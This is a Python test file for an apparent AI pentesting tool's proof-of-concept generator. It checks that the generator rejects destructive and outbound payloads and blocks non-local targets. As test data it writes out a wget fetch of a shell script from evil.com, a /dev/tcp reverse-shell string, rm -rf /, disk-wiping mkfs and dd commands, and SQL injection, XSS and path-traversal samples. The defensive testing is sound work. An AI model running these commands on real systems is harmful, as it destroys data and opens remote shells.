"""
V3.0 AI Pentest - PoC Auto Generator Tests (Full Coverage)

Covers: PoCAutoGenerator, ChainAwarePocResult, GeneratedPocScript,
        generate_chain_poc, generate_verification_suite, _validate_payload,
        _FORBIDDEN_PAYLOAD_PATTERNS, _match_vuln_type (all branches),
        _generate_generic_poc, _build_combined_script, _build_verification_plan
"""
import pytest

from fp_sentinel.models import Finding, Severity
from fp_sentinel.attack.v3_ai_pentest.attack_chain_reasoner import (
    AttackChainReasoner, ReasoningChain, EnhancedReasoningNode,
)
from fp_sentinel.attack.v3_ai_pentest.poc_auto_generator import (
    PoCAutoGenerator,
    ChainAwarePocResult,
    GeneratedPocScript,
    generate_chain_poc,
    generate_verification_suite,
    _validate_payload,
    _FORBIDDEN_PAYLOAD_PATTERNS,
)
from fp_sentinel.attack.poc_templates import UnsafeTargetError


# ============================================================
# Test Payload Validation
# ============================================================


class TestPayloadValidation:
    def test_default_payload_returned_for_empty(self):
        result = _validate_payload("", "sqli-union")
        assert result != ""

    def test_default_payload_returned_for_none(self):
        """None payload returns default."""
        result = _validate_payload(None, "sqli-union")
        assert result != ""

    def test_valid_payloads_accepted(self):
        valid = [
            "1' UNION SELECT null-- -",
            "<script>alert(1)</script>",
            "../../../../etc/passwd",
            "; echo fp_sentinel_verify",
        ]
        for p in valid:
            result = _validate_payload(p, "sqli-union")
            assert result == p

    def test_forbidden_payloads_rejected(self):
        with pytest.raises(ValueError):
            _validate_payload("rm -rf /", "cmd-injection")

    def test_forbidden_external_fetch(self):
        with pytest.raises(ValueError):
            _validate_payload("wget http://evil.com/shell.sh", "cmd-injection")

    def test_forbidden_curl_internal(self):
        """Internal network fetch is blocked."""
        with pytest.raises(ValueError):
            _validate_payload("curl http://10.0.0.1/admin", "cmd-injection")

    def test_forbidden_curl_192(self):
        """192.168.x.x fetch is blocked."""
        with pytest.raises(ValueError):
            _validate_payload("curl http://192.168.1.1", "cmd-injection")

    def test_forbidden_dev_tcp(self):
        """Reverse shell /dev/tcp pattern blocked."""
        with pytest.raises(ValueError):
            _validate_payload("/dev/tcp/10.0.0.1/4444", "cmd-injection")

    def test_forbidden_mkfs(self):
        """Disk wipe command blocked."""
        with pytest.raises(ValueError):
            _validate_payload("mkfs.ext4 /dev/sda", "cmd-injection")

    def test_forbidden_dd(self):
        """Disk overwrite blocked."""
        with pytest.raises(ValueError):
            _validate_payload("dd if=/dev/zero of=/dev/sda", "cmd-injection")

    def test_case_insensitive_forbidden(self):
        """Forbidden patterns are case-insensitive."""
        with pytest.raises(ValueError):
            _validate_payload("RM -RF /", "cmd-injection")

    def test_forbidden_patterns_list(self):
        """Verify the forbidden patterns list is defined."""
        assert len(_FORBIDDEN_PAYLOAD_PATTERNS) > 0
        assert "rm -rf /" in _FORBIDDEN_PAYLOAD_PATTERNS


# ============================================================
# Test PoCAutoGenerator Construction
# ============================================================


class TestPoCAutoGeneratorConstruction:
    def test_default_construction(self):
        gen = PoCAutoGenerator()
        assert gen.default_target == "http://127.0.0.1:8080"
        assert gen.default_language == "auto"

    def test_custom_construction(self):
        gen = PoCAutoGenerator(
            default_target="http://localhost:5000",
            default_language="python",
        )
        assert gen.default_target == "http://localhost:5000"
        assert gen.default_language == "python"

    def test_non_local_target_rejected(self):
        """Non-local target should raise."""
        with pytest.raises(UnsafeTargetError):
            PoCAutoGenerator(default_target="http://evil.com")


# ============================================================
# Test Single PoC Generation
# ============================================================


class TestGenerateSingle:
    def setup_method(self):
        self.gen = PoCAutoGenerator(default_target="http://127.0.0.1:8080")

    def test_generate_single_sqli(self):
        script = self.gen.generate_single("sqli-union")
        assert isinstance(script, GeneratedPocScript)
        assert script.vuln_type == "sqli-union"
        assert "127.0.0.1" in script.target

    def test_generate_single_xss(self):
        script = self.gen.generate_single("xss-reflected")
        assert isinstance(script, GeneratedPocScript)
        assert script.vuln_type == "xss-reflected"

    def test_generate_single_cmd_injection(self):
        script = self.gen.generate_single("cmd-injection")
        assert script.vuln_type == "cmd-injection"

    def test_generate_single_path_traversal(self):
        script = self.gen.generate_single("path-traversal")
        assert script.vuln_type == "path-traversal"

    def test_generate_single_ssrf(self):
        script = self.gen.generate_single("ssrf")
        assert script.vuln_type == "ssrf"

    def test_generate_single_jwt_weak(self):
        script = self.gen.generate_single("jwt-weak")
        assert script.vuln_type == "jwt-weak"

    def test_generate_single_xxe(self):
        script = self.gen.generate_single("xxe")
        assert script.vuln_type == "xxe"

    def test_generate_single_ssti(self):
        script = self.gen.generate_single("ssti")
        assert script.vuln_type == "ssti"

    def test_generate_single_nosql(self):
        script = self.gen.generate_single("nosql-injection")
        assert script.vuln_type == "nosql-injection"

    def test_generate_single_idor(self):
        script = self.gen.generate_single("idor")
        assert script.vuln_type == "idor"

    def test_generate_single_open_redirect(self):
        script = self.gen.generate_single("open-redirect")
        assert script.vuln_type == "open-redirect"

    def test_generate_single_deser_pickle(self):
        script = self.gen.generate_single("deser-pickle")
        assert script.vuln_type == "deser-pickle"

    def test_generate_single_custom_param(self):
        script = self.gen.generate_single("sqli-union", param="user_id")
        assert isinstance(script, GeneratedPocScript)

    def test_generate_single_custom_payload(self):
        script = self.gen.generate_single("sqli-union", payload="1' OR 1=1-- -")
        assert script.custom_payload_used
        assert "1' OR 1=1" in script.script_content

    def test_generate_single_forbidden_payload_raises(self):
        """Forbidden payload should raise ValueError."""
        with pytest.raises(ValueError):
            self.gen.generate_single("cmd-injection", payload="rm -rf /")

    def test_generate_single_invalid_target(self):
        with pytest.raises(UnsafeTargetError):
            self.gen.generate_single("sqli-union", target="http://evil.com")

    def test_generate_single_unknown_vuln_type(self):
        with pytest.raises(KeyError):
            self.gen.generate_single("no-such-vuln-type")

    def test_script_has_safety_notes(self):
        script = self.gen.generate_single("sqli-union")
        assert len(script.safety_notes) > 0

    def test_script_has_run_instructions(self):
        script = self.gen.generate_single("sqli-union")
        assert script.run_instructions != ""

    def test_script_has_description(self):
        script = self.gen.generate_single("sqli-union")
        assert script.description != ""

    def test_script_safe_explanation(self):
        script = self.gen.generate_single("sqli-union")
        assert script.safe_explanation != ""

    def test_script_reference_cve(self):
        script = self.gen.generate_single("sqli-union")
        assert script.reference_cve != ""

    def test_script_default_chain_index_is_minus_one(self):
        script = self.gen.generate_single("sqli-union")
        assert script.chain_step_index == -1

    def test_script_default_chain_id_empty(self):
        script = self.gen.generate_single("sqli-union")
        assert script.chain_id == ""

    def test_generate_with_custom_language(self):
        script = self.gen.generate_single("sqli-union", language="shell")
        assert isinstance(script, GeneratedPocScript)
        assert script.language == "shell"

    def test_generate_with_jwt_secret(self):
        script = self.gen.generate_single("jwt-weak", secret="custom-secret-key")
        assert isinstance(script, GeneratedPocScript)


# ============================================================
# Test Match Vuln Type (all branches)
# ============================================================


class TestMatchVulnType:
    def setup_method(self):
        self.gen = PoCAutoGenerator()

    def test_match_sqli(self):
        assert self.gen._match_vuln_type("sql-injection") == "sqli-union"

    def test_match_xss(self):
        assert self.gen._match_vuln_type("reflected-xss") == "xss-reflected"

    def test_match_command(self):
        assert self.gen._match_vuln_type("cmd-injection") == "cmd-injection"

    def test_match_path_traversal(self):
        assert self.gen._match_vuln_type("path-traversal") == "path-traversal"

    def test_match_ssrf(self):
        assert self.gen._match_vuln_type("ssrf") == "ssrf"

    def test_match_jwt(self):
        assert self.gen._match_vuln_type("jwt-weak-secret") == "jwt-weak"

    def test_fuzzy_sql(self):
        """Fuzzy match when not in templates."""
        result = self.gen._match_vuln_type("some-sql-rule")
        assert result == "sqli-union"

    def test_fuzzy_xss(self):
        result = self.gen._match_vuln_type("rule-with-xss-attack")
        assert result == "xss-reflected"

    def test_fuzzy_command_with_system(self):
        """os.system should fuzzy match to cmd-injection."""
        result = self.gen._match_vuln_type("py.cmd.os.system")
        assert result == "cmd-injection"

    def test_fuzzy_command_cmd(self):
        result = self.gen._match_vuln_type("rule-cmd-something")
        assert result == "cmd-injection"

    def test_fuzzy_path_traversal(self):
        result = self.gen._match_vuln_type("my-path-traversal-rule")
        assert result == "path-traversal"

    def test_fuzzy_ssrf(self):
        result = self.gen._match_vuln_type("ssrf-file-get")
        assert result == "ssrf"

    def test_fuzzy_jwt(self):
        result = self.gen._match_vuln_type("jwt-none-algo")
        assert result == "jwt-weak"

    def test_fuzzy_eval(self):
        result = self.gen._match_vuln_type("py.eval.exec")
        assert result == "cmd-injection"

    def test_fuzzy_pickle(self):
        result = self.gen._match_vuln_type("py.deser.pickle")
        assert result == "deser-pickle"

    def test_fuzzy_yaml(self):
        result = self.gen._match_vuln_type("py.yaml.load")
        assert result == "deser-pickle"

    def test_fuzzy_xxe(self):
        result = self.gen._match_vuln_type("xxe-xml-injection")
        assert result == "xxe"

    def test_fuzzy_ssti(self):
        result = self.gen._match_vuln_type("template-injection-ssti")
        assert result == "ssti"

    def test_fuzzy_template(self):
        result = self.gen._match_vuln_type("py.template.render")
        assert result == "ssti"

    def test_fuzzy_redirect(self):
        result = self.gen._match_vuln_type("open-redirect")
        assert result == "open-redirect"

    def test_fuzzy_nosql(self):
        result = self.gen._match_vuln_type("mongo-nosql-injection")
        assert result == "nosql-injection"

    def test_fuzzy_mongo(self):
        result = self.gen._match_vuln_type("mongodb.find")
        assert result == "nosql-injection"

    def test_fuzzy_idor(self):
        result = self.gen._match_vuln_type("idor-access")
        assert result == "idor"

    def test_no_match_returns_none(self):
        """Rule IDs with no match return None (generic PoC)."""
        result = self.gen._match_vuln_type("completely-unknown-vulnerability-nnn")
        assert result is None

    def test_none_with_special_characters(self):
        result = self.gen._match_vuln_type("rule:with:colons")
        # No match expected since none of the fuzzy patterns match
        assert result is None


# ============================================================
# Test Generate Generic PoC
# ============================================================


class TestGenerateGenericPoc:
    def setup_method(self):
        self.gen = PoCAutoGenerator()

    def test_generic_poc_created_when_no_match(self):
        """Test generic PoC generation for unmatched vulnerability type."""
        from unittest.mock import MagicMock
        node = MagicMock()
        node.rule_id = "completely-unknown-rule"
        node.file_path = "/src/app.py"
        node.line = 42

        script = self.gen._generate_generic_poc(
            node, "http://127.0.0.1:8080", 0, "CHAIN-abc123",
        )
        assert script.vuln_type == "completely-unknown-rule"
        assert script.chain_step_index == 0
        assert script.chain_id == "CHAIN-abc123"
        assert "fp_sentinel_verify" in script.script_content
        assert "curl" in script.script_content
        assert script.language == "shell"
        assert len(script.safety_notes) > 0

    def test_generic_poc_with_known_cve(self):
        """Generic PoC should try to find CVE from templates."""
        from unittest.mock import MagicMock
        node = MagicMock()
        node.rule_id = "xss-unknown-variant"
        node.file_path = "/src/page.html"
        node.line = 100

        script = self.gen._generate_generic_poc(
            node, "http://127.0.0.1:8080", 1, "CHAIN-def456",
        )
        # Should map to xss CVE
        assert script.chain_step_index == 1
        assert script.chain_id == "CHAIN-def456"
        assert script.run_instructions != ""


# ============================================================
# Test Chain-Aware PoC Generation
# ============================================================


class TestChainAware:
    def setup_method(self):
        self.gen = PoCAutoGenerator(default_target="http://127.0.0.1:8080")

    def _get_chain(self):
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        return report.chains[0] if report.chains else None

    def test_generate_for_chain(self):
        chain = self._get_chain()
        if chain is None:
            pytest.skip("No chain generated")
        result = self.gen.generate_for_chain(chain)
        assert isinstance(result, ChainAwarePocResult)
        assert len(result.scripts) >= 2
        assert result.combined_script != ""
        assert len(result.verification_plan) >= 2

    def test_generate_for_chain_with_custom_payload(self):
        chain = self._get_chain()
        if chain is None:
            pytest.skip("No chain generated")
        result = self.gen.generate_for_chain(
            chain,
            custom_payloads={1: "custom-test-payload"},
        )
        assert isinstance(result, ChainAwarePocResult)

    def test_generate_for_chain_with_forbidden_payload_falls_back(self):
        """Forbidden payload should fallback to None."""
        chain = self._get_chain()
        if chain is None:
            pytest.skip("No chain generated")
        result = self.gen.generate_for_chain(
            chain,
            custom_payloads={0: "rm -rf /"},  # should fall back to default
        )
        assert isinstance(result, ChainAwarePocResult)

    def test_generate_for_chain_safety_declaration(self):
        """Result should include safety declaration."""
        chain = self._get_chain()
        if chain is None:
            pytest.skip("No chain generated")
        result = self.gen.generate_for_chain(chain)
        assert result.safety_declaration != ""
        assert "PoC" in result.safety_declaration

    def test_generate_for_chain_sets_chain_metadata(self):
        """Scripts should have chain_step_index and chain_id set."""
        chain = self._get_chain()
        if chain is None:
            pytest.skip("No chain generated")
        result = self.gen.generate_for_chain(chain)
        for i, script in enumerate(result.scripts):
            assert script.chain_step_index == i
            assert script.chain_id == chain.id

    def test_generate_for_chain_overall_risk(self):
        """Result should carry chain risk information."""
        chain = self._get_chain()
        if chain is None:
            pytest.skip("No chain generated")
        result = self.gen.generate_for_chain(chain)
        assert result.overall_risk == chain.overall_risk
        assert result.chain_probability == chain.chain_probability
        assert result.chain_id == chain.id
        assert result.chain_name == chain.name

    def test_generate_for_chain_generated_at(self):
        """Result should have a timestamp."""
        chain = self._get_chain()
        if chain is None:
            pytest.skip("No chain generated")
        result = self.gen.generate_for_chain(chain)
        assert result.generated_at != ""

    def test_verification_plan_structure(self):
        """Verification plan should have correct structure."""
        chain = self._get_chain()
        if chain is None:
            pytest.skip("No chain generated")
        result = self.gen.generate_for_chain(chain)
        for entry in result.verification_plan:
            assert "step" in entry
            assert "vuln_type" in entry
            assert "file" in entry
            assert "line" in entry
            assert "language" in entry
            assert "target" in entry
            assert "param" in entry

    def test_combined_script_content(self):
        """Combined script includes chain info and steps."""
        chain = self._get_chain()
        if chain is None:
            pytest.skip("No chain generated")
        result = self.gen.generate_for_chain(chain)
        assert "攻击链" in result.combined_script
        assert chain.id in result.combined_script

    def test_generate_for_chain_unmatched_node(self):
        """Chain with completely unknown rule IDs triggers generic PoC path."""
        chain = ReasoningChain(
            nodes=[
                EnhancedReasoningNode(
                    id="n1", rule_id="xx-custom-unknown-rule",
                    file_path="app.py", line=10,
                    severity="HIGH", node_role="entry",
                    propagated_risk=30,
                ),
                EnhancedReasoningNode(
                    id="n2", rule_id="yy-another-unique-rule",
                    file_path="app.py", line=20,
                    severity="HIGH", node_role="sink",
                    propagated_risk=30,
                ),
            ],
            edges=[],
        )
        result = self.gen.generate_for_chain(chain)
        assert len(result.scripts) >= 2
        # Verify generic fallback was used for the unknown rule
        assert any(s.vuln_type == "xx-custom-unknown-rule" for s in result.scripts)


# ============================================================
# Test Verification Suite Generation
# ============================================================


class TestVerificationSuite:
    def test_generate_verification_suite(self):
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        gen = PoCAutoGenerator()
        results = gen.generate_for_report(report)
        assert isinstance(results, list)

    def test_generate_for_report_empty(self):
        """Empty report produces empty list."""
        report = AttackChainReasoner().reason([])
        gen = PoCAutoGenerator()
        results = gen.generate_for_report(report)
        assert results == []

    def test_generate_for_report_with_custom_payloads(self):
        """Custom payloads passed per chain ID."""
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        gen = PoCAutoGenerator()
        custom = {}
        for c in report.chains:
            custom[c.id] = {0: "custom-payload-for-first-step"}
        results = gen.generate_for_report(report, custom_payloads=custom)
        assert isinstance(results, list)

    def test_generate_for_report_uses_default_target(self):
        """Generate report uses the default target."""
        findings = [
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=10, code_snippet="x"),
        ]
        report = AttackChainReasoner().reason(findings)
        gen = PoCAutoGenerator(default_target="http://127.0.0.1:5000")
        results = gen.generate_for_report(report)
        # Verify default target is used
        for result in results:
            for script in result.scripts:
                assert "127.0.0.1" in script.target


# ============================================================
# Test Convenience APIs
# ============================================================


class TestConvenienceAPIs:
    def test_generate_chain_poc_func(self):
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        if report.chains:
            result = generate_chain_poc(report.chains[0])
            assert isinstance(result, ChainAwarePocResult)

    def test_generate_chain_poc_func_custom_target(self):
        """Custom target passed through."""
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        if report.chains:
            result = generate_chain_poc(
                report.chains[0],
                target="http://127.0.0.1:5000",
            )
            assert isinstance(result, ChainAwarePocResult)

    def test_generate_verification_suite_func(self):
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        results = generate_verification_suite(report)
        assert isinstance(results, list)

    def test_generate_verification_suite_func_custom_payloads(self):
        findings = [
            Finding(scanner="test", rule_id="py.xss.dom", severity=Severity.HIGH,
                    file_path="app.py", line_start=10, code_snippet="x"),
            Finding(scanner="test", rule_id="py.injection.sql", severity=Severity.CRITICAL,
                    file_path="app.py", line_start=20, code_snippet="y"),
        ]
        report = AttackChainReasoner().reason(findings)
        custom = {}
        for c in report.chains:
            custom[c.id] = {0: "test-payload"}
        results = generate_verification_suite(report, custom_payloads=custom)
        assert isinstance(results, list)

    def test_generate_verification_suite_no_chains(self):
        """Verify suite on report with no chains returns empty."""
        report = AttackChainReasoner().reason([])
        results = generate_verification_suite(report)
        assert results == []


# ============================================================
# Test GeneratedPocScript Dataclass
# ============================================================


class TestGeneratedPocScript:
    def test_script_has_dependencies(self):
        gen = PoCAutoGenerator()
        script = gen.generate_single("sqli-union")
        assert isinstance(script.dependencies, list)

    def test_script_has_safe_explanation(self):
        gen = PoCAutoGenerator()
        script = gen.generate_single("sqli-union")
        assert script.safe_explanation != ""


# ============================================================
# Test ChainAwarePocResult Dataclass
# ============================================================


class TestChainAwarePocResult:
    def test_default_construction(self):
        result = ChainAwarePocResult()
        assert result.chain_id == ""
        assert result.overall_risk == 0.0
        assert result.scripts == []

    def test_full_construction(self):
        result = ChainAwarePocResult(
            chain_id="CHAIN-test",
            chain_name="test chain",
            overall_risk=75.0,
            chain_probability=60.0,
            scripts=[GeneratedPocScript(
                vuln_type="sqli", language="bash",
                target="http://127.0.0.1:8080", param="id",
                script_content="curl test", description="test",
                safe_explanation="safe", reference_cve="CVE-2023-0001",
            )],
            combined_script="combined script",
            verification_plan=[{"step": 1}],
            generated_at="2025-01-01",
            safety_declaration="test",
        )
        assert result.chain_id == "CHAIN-test"
        assert len(result.scripts) == 1


# ============================================================
# Test edge cases for _match_vuln_type using BOTH paths
# ============================================================


class TestMatchVulnTypeEdgeCases:
    """Additional tests to exercise both the exact-match path and the fuzzy path."""

    def setup_method(self):
        self.gen = PoCAutoGenerator()

    def test_innerhtml_fuzzy(self):
        """innerHTML should match xss-reflected via lowercased rule_id.
        Note: _match_vuln_type lowercases the rule_id first, so "innerHTML" check
        requires the original case to match - we test a rule that contains "xss"."""
        assert self.gen._match_vuln_type("dom-xss-innerHTML-leak") == "xss-reflected"

    def test_nosql_exact_via_nosql_injection_template(self):
        """nosql-injection is in templates, direct match."""
        assert self.gen._match_vuln_type("nosql-injection") == "nosql-injection"

    def test_template_name_fuzzy(self):
        assert self.gen._match_vuln_type("jinja2-template-injection") == "ssti"

    def test_open_redirect_exact_in_templates(self):
        assert self.gen._match_vuln_type("open-redirect") == "open-redirect"

    def test_idor_exact_in_templates(self):
        assert self.gen._match_vuln_type("idor") == "idor"

    def test_xxe_exact_in_templates(self):
        assert self.gen._match_vuln_type("xxe") == "xxe"

    def test_jwt_exact_in_templates(self):
        assert self.gen._match_vuln_type("jwt-weak") == "jwt-weak"

    def test_yield_none_for_non_vuln_terms(self):
        assert self.gen._match_vuln_type("format-string-bug") is None

    def test_empty_string_rule(self):
        result = self.gen._match_vuln_type("")
        assert result is None

    def test_underscore_normalization(self):
        """rule_id containing 'sql_injection' or similar underscore forms."""
        # Template keys use hyphens so sql-injection matches directly
        assert self.gen._match_vuln_type("sql-injection") == "sqli-union"
